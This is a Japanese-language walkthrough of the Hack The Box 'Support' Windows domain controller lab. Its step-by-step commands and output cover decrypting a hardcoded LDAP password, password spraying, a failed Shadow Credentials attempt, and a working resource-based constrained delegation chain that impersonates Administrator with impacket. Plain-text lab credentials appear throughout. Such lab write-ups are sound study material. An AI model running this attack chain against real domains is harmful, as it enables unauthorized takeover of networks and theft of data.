![](https://i.imgur.com/MFFHLmO.png)


- URL : https://app.hackthebox.com/machines/484
- #easy 
- OS : #Windows
- Machine Author(s): [0xdf](https://app.hackthebox.com/users/4935)
- Hack Date: 2025-07-29,23:57

# Enumeration
Principle
1. **目に見えるものだけがすべてではない。** あらゆる視点を考慮しろ
2. 見えていることと、見えていないことを区別しろ
3. **常に情報を得る手段は存在する。** 対象をしっかり理解しろ

## Nmap
DCなのは間違いない

| **ポート**   | **サービス**     | **バージョン**                               | **その他**                                              |
| --------- | ------------ | --------------------------------------- | ---------------------------------------------------- |
| 53/tcp    | **DNS**      | Simple DNS Plus                         |                                                      |
| 88/tcp    | **Kerberos** | Microsoft Windows Kerberos              | server time: 2025-07-29 15:01:25Z                    |
| 135/tcp   | msrpc        | Microsoft Windows RPC                   |                                                      |
| 139/tcp   |              | Microsoft Windows netbios-ssn           |                                                      |
| 389/tcp   | **ldap**     | Microsoft Windows Active Directory LDAP | Domain: support.htb0., Site: Default-First-Site-Name |
| 445/tcp   | **SMB**      | 不明                                      |                                                      |
| 464/tcp   | kpasswd5?    | 不明                                      |                                                      |
| 593/tcp   | ncacn_http   | Microsoft Windows RPC over HTTP 1.0     |                                                      |
| 636/tcp   | **LDAPS**    | 不明                                      |                                                      |
| 3268/tcp  | ldap         | Microsoft Windows Active Directory LDAP | Domain: support.htb0., Site: Default-First-Site-Name |
| 3269/tcp  | tcpwrapped   | 不明                                      |                                                      |
| 5985/tcp  | **WinRM**    | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | Title: Not FoundServer Header: Microsoft-HTTPAPI/2.0 |
| 9389/tcp  | **ADWS**     | .NET Message Framing                    |                                                      |
| 49664/tcp | msrpc        | Microsoft Windows RPC                   |                                                      |
| 49668/tcp | msrpc        | Microsoft Windows RPC                   |                                                      |
| 49678/tcp | ncacn_http   | Microsoft Windows RPC over HTTP 1.0     |                                                      |
| 49683/tcp | msrpc        | Microsoft Windows RPC                   |                                                      |
| 49707/tcp | msrpc        | Microsoft Windows RPC                   |                                                      |
| 49745/tcp | msrpc        | Microsoft Windows RPC                   |                                                      |

ドメイン :  support.htb0

```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-29 15:01:25Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49678/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49683/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49707/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49745/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=7/29%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=6888E2A5%P=aarch64-unknown-linux-gnu)
SEQ(SP=104%GCD=1%ISR=10C%TI=I%II=I%SS=S%TS=A)
SEQ(SP=FF%GCD=1%ISR=105%TI=I%II=I%SS=S%TS=A)
OPS(O1=M552NW8ST11%O2=M552NW8ST11%O3=M552NW8NNT11%O4=M552NW8ST11%O5=M552NW8ST11%O6=M552ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)
```


## LDAP
- 匿名ログインできなさそう
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Support]
└─$ nxc ldap support.htb0 -u 'guest' -p '' --users                                                                              
LDAP        10.129.230.181  389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)
LDAP        10.129.230.181  389    DC               [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090A5A, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c
LDAP        10.129.230.181  389    DC               [+] support.htb\guest: 
LDAP        10.129.230.181  389    DC               [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090A5A, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c

```

こっちでも、認証しろとのこと
```sh
└─$ ldapsearch -H ldap://10.129.230.181 -x -b "DC=support,DC=htb0" -s sub "(&(objectclass=user))"                                       
# extended LDIF
#
# LDAPv3
# base <DC=support,DC=htb0> with scope subtree
# filter: (&(objectclass=user))
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5A, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4f7c

# numResponses: 1

```
## RPC
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Support]
└─$ rpcclient -U "" -N $Target_IP
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> 
```
# Foothold

## SMB
- smbclient
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Support]
└─$ smbclient -N -L //$Target_IP                  

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.230.181 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

support-toolsフォルダの中身
- RDPとか、Psexecとかで接続して、解析するときのツールとして使う感じなのかな
	- UserInfo.exe.zipは怪しい
```bash
└─$ smbclient -N //$Target_IP/support-tools                           
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 20 10:01:06 2022
  ..                                  D        0  Sat May 28 04:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 04:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 04:19:55 2022
  putty.exe                           A  1273576  Sat May 28 04:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 04:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 10:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 04:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 04:19:43 2022

                4026367 blocks of size 4096. 970701 blocks available
```

書き込みはできなさそう
```sh
smb: \> put open_ports.txt
NT_STATUS_ACCESS_DENIED opening remote file \open_ports.txt
```
### UserInfo.exe.zip
- UserInfo.exe.zipを解凍して、UserInfo.exeを、dnSpyで逆コンパイルする
	- すると、指定した名前やユーザー名で Active Directory を検索し、ユーザー情報を表示する LDAP クエリツールであることがわかる

以下のコードが、大まかなアプリの振る舞いの外観を示していると考えられる
- 12行目の`string.password`に注目すると、`Procted.getPassword();` の戻り値を取得していることがわかる
- 13行目に、LDAPバインド用のデフォルトユーザー：`support\ldap`がハードコードされてる
![](https://i.imgur.com/I1cXI2C.png)

`Procted.getPassword();`をみると、Base64＋XORで暗号化されたパスワードを復号するクラスがあり、復号前のパスワードは、`0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E`であることがわかる
![](https://i.imgur.com/ZHWB5Wj.png)

以下、コード部のみ抽出
```c
using System;
using System.Text;

namespace UserInfo.Services
{
	// Token: 0x02000006 RID: 6
	internal class Protected
	{
		// Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318
		public static string getPassword()
		{
			byte[] array = Convert.FromBase64String(Protected.enc_password);
			byte[] array2 = array;
			for (int i = 0; i < array.Length; i++)
			{
				array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
			}
			return Encoding.Default.GetString(array2);
		}

		// Token: 0x04000005 RID: 5
		private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

		// Token: 0x04000006 RID: 6
		private static byte[] key = Encoding.ASCII.GetBytes("armando");
	}
}
```

そこで、復号する
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine]
└─$ python3 -c "import base64; enc='0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E'; key=b'armando'; data=base64.b64decode(enc); print(''.join([chr(b ^ key[i % len(key)] ^ 223) for i, b in enumerate(data)]))"
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

これで、LDAPの`ldap`ユーザーの認証情報を取得できた
- `ldap` : `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`


# Lateral Movement
- `ldap`ユーザーの認証情報を使って、情報収集する
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Support]
└─$ nxc ldap support.htb0 -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --users
LDAP        10.129.230.181  389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)
LDAP        10.129.230.181  389    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 
LDAP        10.129.230.181  389    DC               [*] Enumerated 20 domain users: support.htb
LDAP        10.129.230.181  389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.129.230.181  389    DC               Administrator                 2022-07-19 10:55:56 0        Built-in account for administering the computer/domain      
LDAP        10.129.230.181  389    DC               Guest                         2022-05-28 04:18:55 0        Built-in account for guest access to the computer/domain    
LDAP        10.129.230.181  389    DC               krbtgt                        2022-05-28 04:03:43 0        Key Distribution Center Service Account                     
LDAP        10.129.230.181  389    DC               ldap                          2022-05-28 04:11:46 0                                                                    
LDAP        10.129.230.181  389    DC               support                       2022-05-28 04:12:00 0                                                                    
LDAP        10.129.230.181  389    DC               smith.rosario                 2022-05-28 04:12:19 0                                                                    
LDAP        10.129.230.181  389    DC               hernandez.stanley             2022-05-28 04:12:34 0                                                                    
LDAP        10.129.230.181  389    DC               wilson.shelby                 2022-05-28 04:12:50 0                                                                    
LDAP        10.129.230.181  389    DC               anderson.damian               2022-05-28 04:13:05 0                                                                    
LDAP        10.129.230.181  389    DC               thomas.raphael                2022-05-28 04:13:21 0                                                                    
LDAP        10.129.230.181  389    DC               levine.leopoldo               2022-05-28 04:13:37 0                                                                    
LDAP        10.129.230.181  389    DC               raven.clifton                 2022-05-28 04:13:53 0                                                                    
LDAP        10.129.230.181  389    DC               bardot.mary                   2022-05-28 04:14:08 0                                                                    
LDAP        10.129.230.181  389    DC               cromwell.gerard               2022-05-28 04:14:24 0                                                                    
LDAP        10.129.230.181  389    DC               monroe.david                  2022-05-28 04:14:39 0                                                                    
LDAP        10.129.230.181  389    DC               west.laura                    2022-05-28 04:14:55 0                                                                    
LDAP        10.129.230.181  389    DC               langley.lucy                  2022-05-28 04:15:10 0                                                                    
LDAP        10.129.230.181  389    DC               daughtler.mabel               2022-05-28 04:15:26 0                                                                    
LDAP        10.129.230.181  389    DC               stoll.rachelle                2022-05-28 04:15:42 0                                                                    
LDAP        10.129.230.181  389    DC               ford.victoria                 2022-05-28 04:15:58 0                                                                    
```

BloodHoundも実行する
- AS-REP Roastingと、Kerberos攻撃できるユーザーはいない
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Support]
└─$ bloodhound-python -c All -d support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -ns 10.129.230.181 -op support_htb --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: support.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.support.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.support.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.support.htb
INFO: Found 21 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.support.htb
INFO: Done in 00M 29S
INFO: Compressing output into 20250729201520_bloodhound.zip
```

ldapdomaindumpも実行する
```bash
sudo ldapdomaindump ldaps://10.129.230.181 -u 'support.htb\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```

OSの詳細な情報がわかった
![](https://i.imgur.com/IR97Ffd.png)

また、ユーザーグループのhtmlから、リモートアクセスできるユーザーはsupportのみであることも、わかった
![](https://i.imgur.com/XayoVdM.png)

![](https://i.imgur.com/K6Vg01z.png)


LDAPのパスワードで、パスワードスプレー攻撃をする
- 特に同じパスワードを使っているユーザーはいなかった
```bash
crackmapexec smb 10.129.230.181 -u valid_user.txt -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' | grep '+'

SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.129.230.181  445    DC               [-] support.htb\Administrator:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.129.230.181  445    DC               [-] support.htb\Guest:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.129.230.181  445    DC               [-] support.htb\krbtgt:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.129.230.181  445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 
SMB         10.129.230.181  445    DC               [-] support.htb\support:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.129.230.181  445    DC               [-] support.htb\smith.rosario:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.129.230.181  445    DC               [-] support.htb\hernandez.stanley:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.129.230.181  445    DC               [-] support.htb\wilson.shelby:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.129.230.181  445    DC               [-] support.htb\anderson.damian:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.129.230.181  445    DC               [-] support.htb\thomas.raphael:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.129.230.181  445    DC               [-] support.htb\levine.leopoldo:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.129.230.181  445    DC               [-] support.htb\raven.clifton:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.129.230.181  445    DC               [-] support.htb\bardot.mary:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.129.230.181  445    DC               [-] support.htb\cromwell.gerard:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.129.230.181  445    DC               [-] support.htb\monroe.david:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.129.230.181  445    DC               [-] support.htb\west.laura:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.129.230.181  445    DC               [-] support.htb\langley.lucy:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.129.230.181  445    DC               [-] support.htb\daughtler.mabel:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.129.230.181  445    DC               [-] support.htb\stoll.rachelle:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.129.230.181  445    DC               [-] support.htb\ford.victoria:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 

```


 LDAPSearch
- supportユーザーについて、LDAPSearchでも探してみる
- すると、infoの部分にパスワードらしき文字列「Ironside47pleasure40Watchful」が書かれている
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Support]
└─$ ldapsearch -x -H ldap://10.129.230.181 -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" "(sAMAccountName=support)"
# extended LDIF
#
# LDAPv3
# base <DC=support,DC=htb> with scope subtree
# filter: (sAMAccountName=support)
# requesting: ALL
#

# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220528111201.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
<SNIP>
```


WinRMで接続してみる
- アクセスできた
```sh
└─$ evil-winrm -i 10.129.230.181 -u support -p Ironside47pleasure40Watchful
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\support\Documents> ls

```

ユーザーフラグ取得できた
```sh
*Evil-WinRM* PS C:\Users\support\Desktop> ls


    Directory: C:\Users\support\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         7/29/2025   7:54 AM             34 user.txt


*Evil-WinRM* PS C:\Users\support\Desktop> type user.txt
```




# Privilege Escalation

supportユーザーは、SHARED Support Accountsグループに入っていて、DCにGenericAllできるってこと？
![](https://i.imgur.com/DrFhZez.png)

GenericAllは基本的になんでもできてしまう
![](https://i.imgur.com/PG3Og6F.png)

Linuxからの攻撃だと、**リソースベースの制約付き委任（Resource-Based Constrained Delegation, RBCD）**、 **シャドウクレデンシャル攻撃**が行える
シャドウクレデンシャル攻撃を行なってみる
- pywhiskerを使用する
	- https://github.com/ShutdownRepo/pywhisker

ドメインコントローラー（DC$） のコンピューターアカウントに対してShadow Credentials を追加する
```bash
└─$ pywhisker -d "support.htb0" -u "support" -p "Ironside47pleasure40Watchful" --target "DC$" --action "add"
[*] Searching for the target account
[*] Target user found: CN=DC,OU=Domain Controllers,DC=support,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 28e2f978-c485-deb4-0fb3-a9171cd65dc9
[*] Updating the msDS-KeyCredentialLink attribute of DC$
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: 4UwehWqZ.pfx
[+] PFX exportiert nach: 4UwehWqZ.pfx
[i] Passwort für PFX: Dmy6MUXFE65c25LHuI1K
[+] Saved PFX (#PKCS12) certificate & key at path: 4UwehWqZ.pfx
[*] Must be used with password: Dmy6MUXFE65c25LHuI1K
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools

```

TGTを取得する
- Shadow Credentials は失敗（KDC 側が未対応か証明書不正）
```bash
                                                                                                                                                                               
┌──(pkinitenv)─(kali㉿kali)-[~/…/HTB/machine/Support/PKINITtools]
└─$ python3 gettgtpkinit.py support.htb/DC\$ \
  -cert-pfx ../4UwehWqZ.pfx \
  -pfx-pass Dmy6MUXFE65c25LHuI1K \
  -dc-ip 10.129.230.181 \
  DC.ccache
2025-07-29 21:17:32,441 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-07-29 21:17:32,457 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
Traceback (most recent call last):
  File "/home/kali/Desktop/HTB/machine/Support/PKINITtools/gettgtpkinit.py", line 349, in <module>
    main()
    ~~~~^^
  File "/home/kali/Desktop/HTB/machine/Support/PKINITtools/gettgtpkinit.py", line 345, in main
    amain(args)
    ~~~~~^^^^^^
  File "/home/kali/Desktop/HTB/machine/Support/PKINITtools/gettgtpkinit.py", line 315, in amain
    res = sock.sendrecv(req)
  File "/home/kali/Desktop/HTB/machine/Support/pkinitenv/lib/python3.13/site-packages/minikerberos/network/clientsocket.py", line 85, in sendrecv
    raise KerberosError(krb_message)
minikerberos.protocol.errors.KerberosError:  Error Name: KDC_ERR_PADATA_TYPE_NOSUPP Detail: "KDC has no support for PADATA type (pre-authentication data)" 
                                                                                                                                                              
```

## リソースベースの制約付き委任
Resource-Based Constrained Delegation に切り替える
Active Directoryドメインに「ATTACKERSYSTEM$」という名前の新しいコンピューターアカウントを追加する
- support ユーザーはドメインにコンピューターを追加する権限を持っているため、この操作が可能\
- ドメイン内で正規のコンピューターとして振る舞うための足がかり
```bash
┌──(pkinitenv)─(kali㉿kali)-[~/…/HTB/machine/Support/PKINITtools]
└─$ impacket-addcomputer -computer-name 'ATTACKERSYSTEM$' \
  -computer-pass 'Summer2018!' \
  -dc-host support.htb0 \
  -domain-netbios SUPPORT \
  'support.htb/support:Ironside47pleasure40Watchful'
/home/kali/Desktop/HTB/machine/Support/pkinitenv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account ATTACKERSYSTEM$ with password Summer2018!.

```

リソースベースの制約付き委任 (RBCD) を設定
- 「`ATTACKERSYSTEM$` が `DC$` (ドメインコントローラー) に対して、任意のユーザーになりすますことを許可する」という設定を `DC$` 側に書き込む
	- `delegate-from 'ATTACKERSYSTEM$'` : 権限を「与える」側（攻撃者のコンピューター）
	- `delegate-to 'DC$'` :  権限を「与えられる」側（標的のドメインコントローラー）
- これにより、「ATTACKERSYSTEM$ は DC$ 上で誰にでも（例えば Administrator にも）なりすまして良いですよ」というお墨付きを DC$ から得たことになる
```bash
┌──(pkinitenv)─(kali㉿kali)-[~/…/HTB/machine/Support/PKINITtools]
└─$ impacket-rbcd -delegate-from 'ATTACKERSYSTEM$' \
  -delegate-to 'DC$' \
  -action write \
  'support.htb0/support:Ironside47pleasure40Watchful'
/home/kali/Desktop/HTB/machine/Support/pkinitenv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ATTACKERSYSTEM$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ATTACKERSYSTEM$   (S-1-5-21-1677581083-3380853377-188903654-6101)

```

「`ATTACKERSYSTEM$`」として、「Administrator」になりすましてドメインコントローラーのCIFSサービスへのアクセスチケット（ST）を取得する
- 前の手順で設定した権限を使い、`Administrator` としてドメインコントローラーのファイル共有サービス (`cifs/dc.support.htb`) にアクセスするためのサービスチケット (ST) を要求
```bash
┌──(pkinitenv)─(kali㉿kali)-[~/…/HTB/machine/Support/PKINITtools]
└─$ impacket-getST -spn cifs/dc.support.htb \
  -impersonate Administrator \
  -dc-ip 10.129.230.181 \
  'support.htb/ATTACKERSYSTEM$:Summer2018!'
/home/kali/Desktop/HTB/machine/Support/pkinitenv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

前のコマンドで取得したサービスチケットを使い、Administrator権限でドメインコントローラーにSMB接続（ファイル共有）を確立して、root.txtを取得
```bash
┌──(pkinitenv)─(kali㉿kali)-[~/…/HTB/machine/Support/PKINITtools]
└─$ impacket-smbclient -k -no-pass support.htb/Administrator@dc.support.htb
/home/kali/Desktop/HTB/machine/Support/pkinitenv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# ls
[-] No share selected
# shares
ADMIN$
C$
IPC$
NETLOGON
support-tools
SYSVOL
# use C$
<SNIP>
# cd Desktop
# ls
drw-rw-rw-          0  Sat May 28 04:17:06 2022 .
drw-rw-rw-          0  Sat May 28 04:11:01 2022 ..
-rw-rw-rw-        282  Thu May 19 02:13:28 2022 desktop.ini
-rw-rw-rw-         34  Tue Jul 29 07:54:28 2025 root.txt
# get root.txt
# 
```
